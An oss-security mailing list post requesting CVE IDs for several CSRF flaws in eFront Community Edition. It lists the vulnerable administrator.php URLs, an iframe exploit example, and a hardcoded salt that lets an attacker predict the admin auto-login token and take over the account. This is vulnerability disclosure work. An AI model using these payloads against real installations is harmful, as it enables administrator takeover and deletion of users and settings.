  oss-security - CVE-Request -- eFront v. build (Community Edition) --  Multiple CSRF vulnerabilities            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Sun, 8 Feb From: Steffen Rรถsemann To: oss-security@...ts.openwall.com Subject: CVE-Request -- eFront v. build (Community Edition) --  Multiple CSRF vulnerabilities  Hi Steve, Josh, vendors, list.  I found multiple CSRF vulnerabilities in eFront v. (build Community Edition.  Technical details:  The vulnerabilities can be found in different modules that are all used in the administrator.php file:  ctg=modules (delete and deactivate/activate modules):  http:// {TARGET}/www/administrator.php?ctg=modules&delete_module={MODULE_NAME}&ajax=ajax http:// {TARGET}/www/administrator.php?ctg=modules&deactivate_module={MODULE_NAME}&ajax=ajax http:// {TARGET}/www/administrator.php?ctg=modules&activate_module={MODULE_NAME}&ajax=ajax  ctg=users (delete and deactivate/activate users):  http:// {TARGET}/www/administrator.php?ctg=users&activate_user={USER_NAME}&ajax=ajax http:// {TARGET}/www/administrator.php?ctg=users&deactivate_user={USER_NAME}&ajax=ajax http:// {TARGET}/www/administrator.php?ctg=users&delete_user={USER_NAME}&ajax=ajax  ctg=themes (activate/deactivate and delete themes):  http:// {TARGET}/www/administrator.php?ctg=themes&tab=set_theme&set_theme={THEME_ID}&ajax=ajax http:// {TARGET}/www/administrator.php?ctg=themes&tab=set_theme&delete={THEME_ID}&ajax=ajax  ctg=digest (deactivate/activate and delete events, e.g. deactivate user registration, deactivate email for account activation)  e.g. EVENT_ID 3 = user email activation e.g. EVENT_ID 4 = user registration  http:// {TARGET}/www/administrator.php?ctg=digests&postAjaxRequest=1&deactivate_notification={EVENT_ID}&event=1&ajax=ajax http:// {TARGET}/www/administrator.php?ctg=digests&postAjaxRequest=1&activate_notification={EVENT_ID}&event=1&ajax=ajax http:// {TARGET}/www/administrator.php?ctg=digests&delete_notification={EVENT_ID}&ajax=1&event=1  ctg=languages (deactivate/activate and delete language settings)  e.g. LANGUAGE_NAME = german  http:// {TARGET}/www/administrator.php?ctg=languages&activate_language={LANGUAGE_NAME}&ajax=ajax http:// {TARGET}/www/administrator.php?ctg=languages&deactivate_language={LANGUAGE_NAME}&ajax=ajax http:// {TARGET}/www/administrator.php?ctg=languages&delete_language={LANGUAGE_NAME}&ajax=ajax   Exploit-Example (valid for all above listed vulnerabilities):  <iframe src="http:// {TARGET}/www/administrator.php?ctg=digests&delete_notification={EVENT_ID}&ajax=1&event=1"></iframe>   The following CSRF-vulnerability can be abused to activate/deactivate the auto-login feature of an arbitrary user:  http://{TARGET}/www/administrator.php?ctg=maintenance&postAjaxRequest=1&autologin=1&login={USERNAME}&ajax=ajax   That makes it possible to login via a URL in an arbitrary user-account like in the following example without providing any login-credentials:  http://{TARGET}/www/index.php?autologin={AUTO_LOGIN_TOKEN}  eFront creates three standard user-accounts while the installation process. One of it is the administrators account.  The components being used for creating the auto-login token are the following informations:  - a salt - the accounts creation date - the username  The salt isn't generated dynamically during the installation. On a common eFront installation without any changes by the administrator, it has the value cDWQR#$Rcxsc. The admin accounts creation date has the standard value  As the standard administrators accountname is "admin", the auto-login token for the administrators account of eFront has always the value if the precondition is fulfilled, that none of the above mentioned values were changed after the installation.  That makes it possible for an attacker to abuse the CSRF-vulnerability to gain access to the administrators account.    Can I have a CVE-ID / CVE-IDs for the issue(s)?  Thank you very much!  Greetings from Germany.  Steffen Rรถsemann  References:  [1] http://www.efrontlearning.net [2] [3] https://github.com/epignosis/efront_open_source/issues/7 [4] [5]   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      